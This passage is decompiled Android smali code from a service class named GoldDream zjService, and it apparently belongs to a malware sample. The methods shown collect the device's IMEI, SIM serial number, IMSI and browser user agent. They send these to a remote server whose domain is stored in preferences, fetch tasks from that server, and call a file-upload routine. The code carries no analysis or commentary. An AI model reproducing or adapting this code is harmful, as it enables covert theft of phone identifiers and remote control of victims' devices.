    move-object/from16 v2, p2

    invoke-virtual {v0, v1, v2}, Lcom/GoldDream/zj/UploadFiles;->uploadFile(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 506
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_1
        :pswitch_0
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
    .end packed-switch
.end method

.method public getDayDuff(Ljava/lang/String;)I
    .locals 7
    .param p1, "lastWorkDate"    # Ljava/lang/String;

    .prologue
    .line 480
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 482
    .local v0, "cal":Ljava/util/Calendar;
    new-instance v3, Ljava/text/SimpleDateFormat;

    const-string v5, "yyyy-MM-dd"

    invoke-direct {v3, v5}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 484
    .local v3, "formatter":Ljava/text/SimpleDateFormat;
    const/4 v4, 0x0

    .line 486
    .local v4, "lastDate":Ljava/util/Date;
    :try_start_0
    invoke-virtual {v3, p1}, Ljava/text/SimpleDateFormat;->parse(Ljava/lang/String;)Ljava/util/Date;
    :try_end_0
    .catch Ljava/text/ParseException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v4

    .line 491
    :goto_0
    invoke-virtual {v0}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v5

    invoke-virtual {v5}, Ljava/util/Date;->getDate()I

    move-result v5

    invoke-virtual {v4}, Ljava/util/Date;->getDate()I

    move-result v6

    sub-int/2addr v5, v6

    const v6, 0x5265c00

    div-int v1, v5, v6

    .line 492
    .local v1, "day":I
    return v1

    .line 487
    .end local v1    # "day":I
    :catch_0
    move-exception v2

    .line 489
    .local v2, "e":Ljava/text/ParseException;
    invoke-virtual {v2}, Ljava/text/ParseException;->printStackTrace()V

    goto :goto_0
.end method

.method public getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "obj"    # Ljava/lang/String;
    .param p2, "keyName"    # Ljava/lang/String;

    .prologue
    .line 699
    const/4 v2, 0x1

    invoke-virtual {p0, p1, v2}, Lcom/GoldDream/zj/zjService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 701
    .local v1, "pre":Landroid/content/SharedPreferences;
    const-string v2, ""

    invoke-interface {v1, p2, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 702
    .local v0, "content":Ljava/lang/String;
    return-object v0
.end method

.method public getNowDate()Ljava/lang/String;
    .locals 5

    .prologue
    .line 496
    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v3, "yyyy-MM-dd"

    invoke-direct {v1, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 497
    .local v1, "formatter":Ljava/text/SimpleDateFormat;
    new-instance v0, Ljava/sql/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v3, v4}, Ljava/sql/Date;-><init>(J)V

    .line 498
    .local v0, "curDate":Ljava/sql/Date;
    invoke-virtual {v1, v0}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v2

    .line 499
    .local v2, "str":Ljava/lang/String;
    return-object v2
.end method

.method public getTaskCountFromServer(Ljava/lang/String;)I
    .locals 4
    .param p1, "taskTypeId"    # Ljava/lang/String;

    .prologue
    .line 502
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "dom"

    const-string v3, "dom_v"

    invoke-virtual {p0, v2, v3}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/zj/countWorkTask.aspx?tti="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 503
    .local v0, "objUrl":Ljava/lang/String;
    invoke-virtual {p0, v0}, Lcom/GoldDream/zj/zjService;->getValueFromServer(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    return v1
.end method

.method public getTaskFromServer(ILjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p1, "tmpNo"    # I
    .param p2, "uid"    # Ljava/lang/String;
    .param p3, "taskTypeId"    # Ljava/lang/String;

    .prologue
    .line 593
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "dom"

    const-string v4, "dom_v"

    invoke-virtual {p0, v3, v4}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/zj/allotWorkTask.aspx?no="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {p1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&uid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&ti="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 594
    .local v0, "objUrl":Ljava/lang/String;
    invoke-virtual {p0, v0}, Lcom/GoldDream/zj/zjService;->getValueFromServer(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 595
    .local v1, "strTask":Ljava/lang/String;
    return-object v1
.end method

.method public getUidfromServer()Ljava/lang/String;
    .locals 11

    .prologue
    .line 646
    const-string v4, ""

    .line 647
    .local v4, "msg":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "http://"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "dom"

    const-string v10, "dom_v"

    invoke-virtual {p0, v9, v10}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "/zj/RegistUid.aspx?"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 648
    .local v6, "registerUrl":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "pid="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "9971"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&cid="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "1000"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&imei="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    sget-object v9, Lcom/GoldDream/zj/zjService;->Dev_MIEI:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&sim="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    sget-object v9, Lcom/GoldDream/zj/zjService;->Dev_SimSSN:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&imsi="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    sget-object v9, Lcom/GoldDream/zj/zjService;->Dev_IMSI:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 649
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "&ua="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    sget-object v9, Lcom/GoldDream/zj/zjService;->MYUA:Ljava/lang/String;

    invoke-virtual {p0, v9}, Lcom/GoldDream/zj/zjService;->removeSpaces(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 653
    :try_start_0
    new-instance v7, Ljava/net/URL;

    invoke-direct {v7, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 656
    .local v7, "url":Ljava/net/URL;
    invoke-virtual {v7}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .line 659
    .local v1, "conn":Ljava/net/HttpURLConnection;
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v8

    const/16 v9, 0xc8

    if-ne v8, v9, :cond_0

    .line 661
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 663
    .local v3, "in":Ljava/io/InputStream;
    invoke-virtual {v3}, Ljava/io/InputStream;->available()I

    move-result v8

    new-array v0, v8, [B

    .line 665
    .local v0, "b":[B
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    .line 667
    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v0}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 672
    .end local v4    # "msg":Ljava/lang/String;
    .local v5, "msg":Ljava/lang/String;
    :try_start_1
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-object v4, v5

    .line 675
    .end local v0    # "b":[B
    .end local v3    # "in":Ljava/io/InputStream;
    .end local v5    # "msg":Ljava/lang/String;
    .restart local v4    # "msg":Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 679
    .end local v1    # "conn":Ljava/net/HttpURLConnection;
    .end local v7    # "url":Ljava/net/URL;
    :goto_0
    const-string v8, "rt"

    const-string v9, "rt_v"

    invoke-virtual {p0, v8, v9, v4}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 680
    return-object v4

    .line 676
    :catch_0
    move-exception v8

    move-object v2, v8

    .line 677
    .local v2, "e":Ljava/lang/Exception;
    :goto_1
    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {p0, v8}, Lcom/GoldDream/zj/zjService;->wl(Ljava/lang/String;)V

    goto :goto_0

    .line 676
    .end local v2    # "e":Ljava/lang/Exception;
    .end local v4    # "msg":Ljava/lang/String;
    .restart local v0    # "b":[B
    .restart local v1    # "conn":Ljava/net/HttpURLConnection;
    .restart local v3    # "in":Ljava/io/InputStream;
    .restart local v5    # "msg":Ljava/lang/String;
    .restart local v7    # "url":Ljava/net/URL;
    :catch_1
    move-exception v8

    move-object v2, v8

    move-object v4, v5

    .end local v5    # "msg":Ljava/lang/String;
    .restart local v4    # "msg":Ljava/lang/String;
    goto :goto_1
.end method

.method public getUserAgent()Ljava/lang/String;
    .locals 4

    .prologue
    const/4 v3, 0x0

    .line 683
    new-instance v2, Landroid/webkit/WebView;

    invoke-direct {v2, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    .line 684
    .local v2, "wv":Landroid/webkit/WebView;
    invoke-virtual {v2, v3, v3, v3, v3}, Landroid/webkit/WebView;->layout(IIII)V

    .line 685
    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    .line 686
    .local v1, "ws":Landroid/webkit/WebSettings;
    invoke-virtual {v1}, Landroid/webkit/WebSettings;->getUserAgentString()Ljava/lang/String;

    move-result-object v0

    .line 687
    .local v0, "ua":Ljava/lang/String;
    return-object v0
.end method

.method public getValueFromServer(Ljava/lang/String;)Ljava/lang/String;
    .locals 9
    .param p1, "objUrl"    # Ljava/lang/String;

    .prologue
    .line 598
    const-string v4, ""

    .line 601
    .local v4, "msg":Ljava/lang/String;
    :try_start_0
    new-instance v6, Ljava/net/URL;

    invoke-direct {v6, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 604
    .local v6, "url":Ljava/net/URL;
    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .line 606
    .local v1, "conn":Ljava/net/HttpURLConnection;
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v7

    const/16 v8, 0xc8

    if-ne v7, v8, :cond_0

    .line 608
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 610
    .local v3, "in":Ljava/io/InputStream;
    invoke-virtual {v3}, Ljava/io/InputStream;->available()I

    move-result v7

    new-array v0, v7, [B

    .line 612
    .local v0, "b":[B
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    .line 614
    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v0}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 615
    .end local v4    # "msg":Ljava/lang/String;
    .local v5, "msg":Ljava/lang/String;
    :try_start_1
    new-instance v4, Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    const-string v8, "UTF-8"

    invoke-direct {v4, v7, v8}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 619
    .end local v5    # "msg":Ljava/lang/String;
    .restart local v4    # "msg":Ljava/lang/String;
    :try_start_2
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 622
    .end local v0    # "b":[B
    .end local v3    # "in":Ljava/io/InputStream;
    :cond_0
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 626
    .end local v1    # "conn":Ljava/net/HttpURLConnection;
    .end local v6    # "url":Ljava/net/URL;
    :goto_0
    return-object v4

    .line 623
    :catch_0
    move-exception v7

    move-object v2, v7

    .line 624
    .local v2, "e":Ljava/lang/Exception;
    :goto_1
    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p0, v7}, Lcom/GoldDream/zj/zjService;->wl(Ljava/lang/String;)V

    goto :goto_0

    .line 623
    .end local v2    # "e":Ljava/lang/Exception;
    .end local v4    # "msg":Ljava/lang/String;
    .restart local v0    # "b":[B
    .restart local v1    # "conn":Ljava/net/HttpURLConnection;
    .restart local v3    # "in":Ljava/io/InputStream;
    .restart local v5    # "msg":Ljava/lang/String;
    .restart local v6    # "url":Ljava/net/URL;
    :catch_1
    move-exception v7

    move-object v2, v7

    move-object v4, v5

    .end local v5    # "msg":Ljava/lang/String;
    .restart local v4    # "msg":Ljava/lang/String;
    goto :goto_1
.end method

.method public installApk(Ljava/lang/String;)V
    .locals 5
    .param p1, "taskInfo"    # Ljava/lang/String;

    .prologue
    .line 555
    const/4 v0, 0x0

    .line 556
    .local v0, "installFlags":I
    invoke-virtual {p0}, Lcom/GoldDream/zj/zjService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 559
    .local v2, "pm":Landroid/content/pm/PackageManager;
    :try_start_0
    invoke-virtual {p0}, Lcom/GoldDream/zj/zjService;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x2000

    invoke-virtual {v2, v3, v4}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 560
    .local v1, "pi":Landroid/content/pm/PackageInfo;
    if-eqz v1, :cond_0

    .line 562
    or-int/lit8 v0, v0, 0x0

    .line 569
    .end local v1    # "pi":Landroid/content/pm/PackageInfo;
    :cond_0
    :goto_0
    return-void

    .line 565
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 134
    const/4 v0, 0x0

    return-object v0
.end method

.method public onConfigurationChanged(Landroid/content/res/Configuration;)V
    .locals 0
    .param p1, "newConfig"    # Landroid/content/res/Configuration;

    .prologue
    .line 141
    invoke-super {p0, p1}, Landroid/app/Service;->onConfigurationChanged(Landroid/content/res/Configuration;)V

    .line 142
    return-void
.end method

.method public onCreate()V
    .locals 1

    .prologue
    .line 148
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->InitializedWorkArea()V

    .line 149
    invoke-virtual {p0}, Lcom/GoldDream/zj/zjService;->getUserAgent()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/GoldDream/zj/zjService;->MYUA:Ljava/lang/String;

    .line 150
    const/16 v0, 0x8

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, Lcom/GoldDream/zj/zjService;->ArryServerParams:[Ljava/lang/String;

    .line 151
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 152
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 158
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 159
    return-void
.end method

.method public onLowMemory()V
    .locals 0

    .prologue
    .line 165
    invoke-super {p0}, Landroid/app/Service;->onLowMemory()V

    .line 166
    return-void
.end method

.method public onRebind(Landroid/content/Intent;)V
    .locals 0
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 172
    invoke-super {p0, p1}, Landroid/app/Service;->onRebind(Landroid/content/Intent;)V

    .line 173
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startId"    # I

    .prologue
    .line 179
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 180
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->InitializedWorkArea()V

    .line 181
    new-instance v0, Lcom/GoldDream/zj/zjService$1;

    invoke-direct {v0, p0}, Lcom/GoldDream/zj/zjService$1;-><init>(Lcom/GoldDream/zj/zjService;)V

    .line 215
    invoke-virtual {v0}, Lcom/GoldDream/zj/zjService$1;->start()V

    .line 216
    return-void
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 692
    invoke-super {p0, p1}, Landroid/app/Service;->onUnbind(Landroid/content/Intent;)Z

    move-result v0

    return v0
.end method

.method public removeSpaces(Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    .line 638
    new-instance v0, Ljava/util/StringTokenizer;

    const-string v2, " "

    const/4 v3, 0x0

    invoke-direct {v0, p1, v2, v3}, Ljava/util/StringTokenizer;-><init>(Ljava/lang/String;Ljava/lang/String;Z)V

    .line 639
    .local v0, "st":Ljava/util/StringTokenizer;
    const-string v1, ""

    .line 640
    .local v1, "t":Ljava/lang/String;
    :goto_0
    invoke-virtual {v0}, Ljava/util/StringTokenizer;->hasMoreElements()Z

    move-result v2

    if-nez v2, :cond_0

    .line 643
    return-object v1

    .line 641
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/util/StringTokenizer;->nextElement()Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto :goto_0
.end method

.method public wl(Ljava/lang/String;)V
    .locals 1
    .param p1, "msg"    # Ljava/lang/String;

    .prologue
    .line 695
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v0, p1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 696
    return-void
.end method
